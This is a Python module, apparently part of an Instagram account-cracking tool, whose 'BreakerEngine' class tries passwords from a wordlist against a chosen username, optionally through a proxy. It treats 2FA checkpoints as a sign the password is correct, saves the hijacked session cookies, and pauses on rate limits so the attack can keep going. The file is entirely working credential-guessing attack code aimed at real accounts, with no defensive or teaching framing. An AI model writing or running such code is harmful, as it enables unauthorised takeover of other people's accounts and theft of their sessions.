import asyncio
from typing import List, Callable, Awaitable
from rich.progress import Progress, TaskID
from ..network.client import AsyncInstagramClient
from ..core.session import SessionManager
from ..utils.display import display

class BreakerEngine:
    def __init__(self, target_username: str, wordlist: List[str], proxy: str | None = None):
        self.target_username = target_username
        self.wordlist = wordlist
        self.proxy = proxy
        self.found_password = None

    async def run(self, progress_callback: Callable[[int], None] = None):
        async with AsyncInstagramClient(proxy=self.proxy) as client:
            for i, password in enumerate(self.wordlist):
                if self.found_password:
                    break
                
                try:
                    display.log(f"Testing: {password}")
                    response = await client.login_attempt(self.target_username, password)
                    
                    if response.status_code == 200:
                        data = response.json()
                        if data.get("authenticated") is True:
                            self.found_password = password
                            # Save session
                            session = SessionManager(self.target_username)
                            session.save_session(client.client.cookies)
                            display.success(f"Successfully found password: {password}")
                            break
                        elif data.get("message") == "checkpoint_required" or "checkpoint_url" in data:
                            display.warning("Checkpoint required (2FA or security check). Password likely correct.")
                            self.found_password = password
                            break
                        elif data.get("user") is True and data.get("authenticated") is False:
                            # Password wrong but user exists
                            pass
                    elif response.status_code == 400:
                        data = response.json()
                        if data.get("message") == "checkpoint_required":
                             display.warning("Checkpoint required. Password likely correct.")
                             self.found_password = password
                             break
                    elif response.status_code == 429:
                        display.warning("Rate limited. Sleeping for 60 seconds...")
                        await asyncio.sleep(60)
                    else:
                        # Failed attempt
                        pass
                except Exception as e:
                    display.error(f"Error testing {password}: {str(e)}")
                
                if progress_callback:
                    progress_callback(1)
                
                # Small delay to avoid immediate rate limit
                await asyncio.sleep(1)

        return self.found_password
